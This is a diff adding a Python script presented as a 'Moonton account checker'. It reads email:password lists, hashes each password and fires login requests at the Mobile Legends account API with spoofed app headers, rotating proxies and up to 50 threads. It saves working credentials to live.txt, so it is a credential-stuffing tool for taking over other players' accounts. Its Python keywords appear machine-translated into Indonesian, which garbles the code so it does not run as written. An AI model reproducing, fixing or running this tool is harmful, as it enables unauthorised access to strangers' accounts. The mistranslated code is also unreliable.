@@ -1,0 +1,510 @@
+# coding = utf-8
+
+#
+# * KODE ULANG? OKE GAK MASSALAH
+# * TAPI YA JANGAN DI JUAL KONTOL
+#
+
+############################################### ##########
+# Nama: Pemeriksa Akun Moonton #
+# File: moonton.py #
+# Penulis: Cyber #
+# Github: https://github.com/Cyber-Indo1 #
+# Versi Python: 3.7 ++ #
+############################################### ##########
+
+impor  os , sys , hashlib , json , random , re
+dari  get_proxy  import  proxy
+
+coba :
+  dari  konkurensi . futures  mengimpor  ThreadPoolExecutor
+kecuali  ImportError :
+  os . sistem (
+    'pip install futures'
+  )
+  keluar (
+    'Harap mulai ulang alat ini'
+  )
+
+coba :
+  dari  bs4  import  BeautifulSoup  sebagai  bs
+kecuali  ImportError :
+  os . sistem (
+    'pip install bs4'
+  )
+  keluar (
+    'Harap mulai ulang alat ini'
+  )
+  
+coba :
+   permintaan impor
+kecuali  ImportError :
+  os . sistem (
+    'permintaan pemasangan pip'
+  )
+  keluar (
+    'Harap mulai ulang alat ini'
+  )
+
+api  =  'https://accountmtapi.mobilelegends.com/'
+
+kelas  MOONTON :
+  def  __init__ ( self , url ):
+    diri . userdata  = []
+    diri . hidup  = []
+    diri . salah_password  = []
+    diri . wrong_email  = []
+    diri . limit_login  = []
+    diri . tidak diketahui  = []
+    diri . proxy_list  = []
+    diri . api  =  url
+    diri . loop  =  0
+    cetak ( '' ' \ 033 [0m
+| V | _ _ __ _ | _ _ __ / | _ _ _ | _ __
+| | (_) (_) | | | _ (_) | | \ __ | | (/ _ (_ | <(/ _ |
+---------------------------------------------
+          - Dibuat Oleh (Cyber.ID) -
+--------------------------------------------- \ n '' ' )
+########################################
+# Tolong jangan hapus nama penulisnya :( #
+########################################
+
+  def  auto_upper ( self , string ):
+    text  =  '' . bergabung (
+      kembali . menemukan (
+        '[azAZ]' ,
+        tali
+      )
+    )
+    jika  teks . lebih rendah (
+      ) ==  Benar :
+      o  =  ''
+      untuk  saya  dalam  jangkauan (
+        len (
+          tali
+        )
+      ):
+        jika  string [ i ]. isnumerik (
+          ) ==  False  dan  string [
+            saya
+          ]. isalpha (
+          ):
+          kembali  o  +  string [
+            saya
+          ]. atas (
+          ) +  string [
+            i + 1 :
+          ]
+        lain : o + = string [
+          saya
+        ]
+       string kembali 
+    else : string kembali 
+
+  def  main ( self ):
+    cetak (
+      '[!] Pemisah email: password atau email | password \ n '
+    )
+    empas  =  masukan (
+      '[?] Daftar empa (misal: list.txt):'
+    )
+    jika  os . jalan . ada (
+      empas
+    ):
+      untuk  data  di tempat  terbuka (
+        empas ,
+        'r' ,
+        encoding = 'utf-8'
+      ). garis baca ():
+        coba :
+          pengguna  =  data . strip (
+          ). split (
+            '|'
+          )
+          jika  pengguna [
+           0
+          ] dan  pengguna [
+            1
+          ]:
+            em  =  pengguna [
+              0
+            ]
+            pw  =  diri . auto_upper (
+              pengguna [
+                1
+              ]
+            )
+            diri . userdata . tambahkan ({
+              'email' : em ,
+              'pw' : pw ,
+              'userdata' : '|' . bergabung (
+                [
+                  em ,
+                  pw
+                ]
+              )
+            })
+        kecuali  IndexError :
+                  coba :
+            pengguna  =  data . strip (). split (
+              ':'
+            )
+            jika  pengguna [
+              0
+            ] dan  pengguna [
+              1
+            ]:
+              em  =  pengguna [
+                0
+              ]
+              pw  =  diri . auto_upper (
+                pengguna [
+                  1
+                ]
+              )
+              diri . userdata . tambahkan ({
+                'email' : em ,
+                'pw' : pw ,
+                'userdata' : ':' . Ikuti (
+                  [
+                    em ,
+                    pw
+                  ]
+                )
+             })
+          kecuali : lulus
+      jika  len (
+        diri . data pengguna
+      ) ==  0 :
+        keluar (
+          '[!] Empas tidak ada atau tidak valid mengizinkan berformat email: pass atau email | pass'
+        )
+      cetak (
+        '[*] Total {0} akun' . format (
+          str (
+            len (
+              diri . data pengguna
+            )
+          )
+        )
+      )
+      tanya  =  masukan (
+        '[?] Apakah ingin menggunakan proxy? ( \ 033 [92mDisarankan \ 033 [0m) [Y / t]:'
+      )
+      jika  ditanya . menurunkan (
+      ). mengupas (
+      ) ==  'y' :
+        diri . valid_proxy  =  proxy . prox (
+        )
+        dengan  ThreadPoolExecutor (
+          max_workers = 50
+        ) sebagai  utas :
+          [
+            benang . menyerahkan (
+              diri . memvalidasi ,
+              pengguna ,
+              Benar
+            ) Untuk  pengguna  di  diri . data pengguna
+          ]
+      lain :
+        cetak (
+          ''
+        )
+        dengan  ThreadPoolExecutor (
+          max_workers = 10
+        ) sebagai  utas :
+          [
+            benang . menyerahkan (
+              diri . memvalidasi ,
+              pengguna ,
+              Salah
+            ) Untuk  pengguna  di  diri . data pengguna
+          ]
+      cetak (
+        ' \ n \ n [#] LANGSUNG:' + str (
+          len (
+            diri . hidup
+          )
+        ) + '- disimpan: live.txt'
+      )
+      jika  len (
+        diri . hidup
+      ) ! =  0 :
+        cetak (
+          ' \ n ' . bergabung (
+            diri . hidup
+          ) + ' \ n '
+        )
+      cetak (
+        '[#] SALAH LULUS:' + str (
+          len (
+            diri . kata sandi salah
+          )
+        ) + '- disimpan: salahPwd.txt'
+      )
+      cetak (
+        '[#] SALAH EMAIL:' + str (
+          len (
+            diri . email yang salah
+          )
+        ) + '- disimpan: salahEmail.txt'
+      )
+      cetak (
+        '[#] BATAS MASUK:' + str (
+          len (
+            diri . limit_login
+          )
+        ) + '- disimpan: limitLogin.txt'
+      )
+      cetak (
+        '[#] TIDAK DIKETAHUI:' + str (
+          len (
+            diri . tidak diketahui
+          )
+        ) + '- disimpan: tidak diketahui.txt'
+      )
+      keluar (
+      )
+    lain : cetak (
+      '[!] File tidak ditemukan "{0}"' . format (
+        empas
+      )
+    )
+
+  def  hash_md5 ( diri , string ):
+    md5  =  hashlib . baru (
+      'md5'
+    )
+    md5 . perbarui (
+      string . menyandikan (
+        'utf-8'
+      )
+    )
+    kembali  md5 . hexdigest (
+    )
+
+  def  build_params ( diri , pengguna ):
+    md5pwd  =  diri . hash_md5 (
+      pengguna [
+        'pw'
+      ]
+    )
+    hashed  =  diri . hash_md5 (
+      'akun = {0} & md5pwd = {1} & op = login' . format (
+        pengguna [
+          'surel'
+        ],
+        md5pwd
+      )
+    )
+    kembali  json . kesedihan ({
+      'op' : 'login' ,
+      'tanda' : hash ,
+      'params' : {
+        'akun' : pengguna [
+          'surel'
+        ],
+        'md5pwd' : md5pwd ,
+      },
+      'lang' : 'cn'
+    })
+  
+  def  validate ( self , user , with_porxy ):
+    coba :
+      data  =  diri . build_params (
+        pengguna
+      )
+      header  = {
+        'host' : 'accountmtapi.mobilelegends.com' ,
+        'agen-pengguna' : 'Mozilla / 5.0' ,
+        'x-diminta-dengan' : 'com.mobile.legends'  # Permintaan palsu
+      }
+      jika  with_porxy  ==  Benar :
+        proxy  =  acak . pilihan (
+          diri . valid_proxy
+        )
+        respon  =  permintaan . posting (
+          diri . api ,
+          data = data ,
+          headers = headers ,
+          proxy = proxy ,
+          batas waktu = 10
+        )
+      lain :
+        respon  =  permintaan . posting (
+          diri . api ,
+          data = data ,
+          headers = headers
+        )
+      jika  respon . status_code  ==  200 :
+        jika  respon . json (
+        ) [
+          'pesan'
+         ] ==  'Error_Success' :
+          cetak (
+            ' \ r [ \ 033 [92mLIVE \ 033 [0m]' + pengguna [
+              'data pengguna'
+             ] + '-> ( \ 033 [92mSukses masuk \ 033 [0m)'
+          )
+          diri . hidup . menambahkan (
+            pengguna [
+              'data pengguna'
+            ]
+          )
+          buka (
+            'live.txt' ,
+            'Sebuah'
+          ). tulis (
+            str (
+              pengguna [
+                'data pengguna'
+              ]
+            ) + ' \ n '
+          )
+         tanggapan elif . json (
+        ) [
+          'pesan'
+         ] ==  'Error_PasswdError' :
+          cetak (
+            ' \ r [ \ 033 [91mDIEE \ 033 [0m]' + pengguna [
+              'data pengguna'
+            ] + '-> ( \ 033 [91mSandi salah \ 033 [0m)'
+          )
+          diri . salah_password . menambahkan (
+            pengguna [
+                          'data pengguna'
+            ]
+          )
+          buka (
+            'salahPwd.txt' ,
+            'Sebuah'
+          ). tulis (
+            str (
+              pengguna [
+                'data pengguna'
+              ]
+            ) + ' \ n '
+          )
+         tanggapan elif . json (
+        ) [
+          'pesan'
+         ] ==  'Error_PwdErrorTooMany' :
+          cetak (
+            ' \ r [ \ 033 [91mDIEE \ 033 [0m]' + pengguna [
+              'data pengguna'
+            ] + '-> ( \ 033 [91mLimit login \ 033 [0m)'
+          )
+          diri . limit_login . menambahkan (
+            pengguna [
+              'data pengguna'
+            ]
+          )
+          buka (
+            'limitLogin.txt' ,
+            'Sebuah'
+          ). tulis (
+            str (
+              pengguna [
+                'data pengguna'
+              ]
+            ) + ' \ n '
+          )
+         tanggapan elif . json (
+        ) [
+          'pesan'
+        ] ==  'Error_NoAccount' :
+          cetak (
+            ' \ r [ \ 033 [91mDIEE \ 033 [0m]' + pengguna [
+              'data pengguna'
+            ] + '-> ( \ 033 [91mSalah email \ 033 [0m)'
+          )
+          diri . salah_email . menambahkan (
+            pengguna [
+              'data pengguna'
+            ]
+          )
+          buka (
+            'salahEmail.txt' ,
+            'Sebuah'
+          ). tulis (
+            str (
+              pengguna [
+                'data pengguna'
+              ]
+            ) + ' \ n '
+          )
+        lain :
+          cetak (
+            ' \ r [ \ 033 [91mDIEE \ 033 [0m]' + pengguna [
+              'data pengguna'
+            ] + '-> ( \ 033 [91mTak Diketahui \ 033 [0m)'
+          )
+          diri . tidak diketahui . menambahkan (
+            pengguna [
+              'data pengguna'
+            ]
+          )
+          buka (
+            'unknown.txt' ,
+            'Sebuah'
+          ). tulis (
+            str (
+              pengguna [
+                'data pengguna'
+              ]
+            ) + ' \ n '
+          )
+        die  =  len (
+          diri . kata sandi salah
+        ) +  len (
+          diri . limit_login
+        ) +  len (
+          diri . email yang salah
+        ) +  len (
+          diri . tidak diketahui
+        )
+        diri . loop + = 1
+        cetak (
+          end = ' \ r [*] Diperiksa:% s /% s LIVE:% s - DIEE:% s' % (
+            str (
+              diri . loop
+            ),
+            str (
+              len (
+                diri . data pengguna
+              )
+            ),
+            str (
+              len (
+                diri . hidup
+              )
+            ),
+            str (
+              mati
+            )
+          ),
+          flush = Benar
+        )
+      lain : diri . validasi (
+        pengguna ,
+        with_porxy
+      )
+    kecuali : diri sendiri . validasi (
+      pengguna ,
+      with_porxy
+    )
+
+jika  __name__  ==  '__main__' :
+  coba :
+    (
+      MOONTON (
+        api
+      ). utama (
+      )
+    )
+  kecuali  Pengecualian  sebagai  E :
+    keluar (
+      '[!] Kesalahan:% s'  % (
+        E
+      )
+    )
